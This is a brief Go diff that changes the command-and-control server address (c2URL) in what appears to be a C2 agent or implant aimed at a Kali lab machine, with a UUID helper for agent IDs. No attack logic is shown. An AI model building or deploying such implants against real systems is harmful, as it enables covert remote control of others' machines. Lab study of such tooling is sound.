@@ -22,7 +22,7 @@ func generateUUID() string {
 	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
 }
 
-var c2URL = "http://192.168.1.69:8080" // Update this if needed to match your Kali IP
+var c2URL = "http://192.168.111.25:8080" // Update this if needed to match your Kali IP
 
 func main() {
 	agentID := generateUUID()
